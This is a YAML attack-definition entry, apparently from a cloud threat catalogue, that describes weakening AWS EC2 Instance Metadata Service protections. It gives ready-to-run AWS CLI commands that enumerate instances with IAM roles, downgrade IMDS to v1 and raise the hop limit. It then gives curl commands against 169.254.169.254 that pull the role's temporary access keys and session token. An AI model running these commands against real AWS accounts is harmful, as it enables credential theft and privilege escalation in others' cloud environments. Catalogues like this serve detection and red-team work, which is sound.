attack:
  id: aws-ec2-imds-protection-weakening
  name: Weaken EC2 Instance Metadata Service (IMDS) Protections
  overview: |
    An attacker with ec2:ModifyInstanceMetadataOptions permission weakens Instance Metadata Service (IMDS) security controls on EC2 instances. By modifying metadata options, the attacker can force the use of IMDSv1 (by making HttpTokens optional) and/or increase the HttpPutResponseHopLimit value. The primary risk vector involves raising the hop limit (TTL), which allows the 169.254.169.254 metadata endpoint to become accessible beyond the instance's immediate network namespace. This enables containers, remote processes, or Server-Side Request Forgery (SSRF) vulnerabilities to reach the metadata service and exfiltrate temporary IAM credentials assigned to the instance role.
  steps:
    - title: Identify Target EC2 Instance
      command: |
        aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" --query "Reservations[].Instances[].[InstanceId,IamInstanceProfile.Arn]" --output table
      dependencies:
        - ec2:DescribeInstances permission
        - Valid AWS credentials with appropriate access
      result: |
        Retrieves a list of running EC2 instances and their associated IAM instance profiles. The attacker identifies instances with valuable IAM roles that can be targeted for credential exfiltration.
      ttp: T1580 - Cloud Infrastructure Discovery
    
    - title: Modify Instance Metadata Options to Weaken Protections
      command: |
        aws ec2 modify-instance-metadata-options \
          --instance-id <INSTANCE_ID> \
          --http-tokens optional \
          --http-endpoint enabled \
          --http-put-response-hop-limit 2
      dependencies:
        - ec2:ModifyInstanceMetadataOptions permission
        - Target instance ID from reconnaissance
        - Instance must be in running or stopped state
      result: |
        Successfully weakens IMDS protections by forcing IMDSv1 (HttpTokens optional) and increasing the hop limit to 2. This configuration allows the metadata endpoint to be accessible from containers, Docker networks, or other processes that are one network hop away from the instance, expanding the attack surface for credential theft.
      ttp: T1562.007 - Impair Defenses: Disable or Modify Cloud Logs
    
    - title: Exfiltrate Instance IAM Credentials via IMDS
      command: |
        # From within a container or via SSRF:
        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
      dependencies:
        - Access to container, process, or SSRF vulnerability on the instance
        - Modified metadata options from previous step
        - Network connectivity to 169.254.169.254 within the increased hop limit
      result: |
        Successfully retrieves temporary IAM credentials (AccessKeyId, SecretAccessKey, SessionToken) assigned to the instance role. The attacker can now use these credentials to perform actions in AWS with the permissions granted to that IAM role, achieving privilege escalation or lateral movement within the cloud environment.
      ttp: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
  
  stride_goal:
    - Tampering
    - Information Disclosure
    - Elevation of Privilege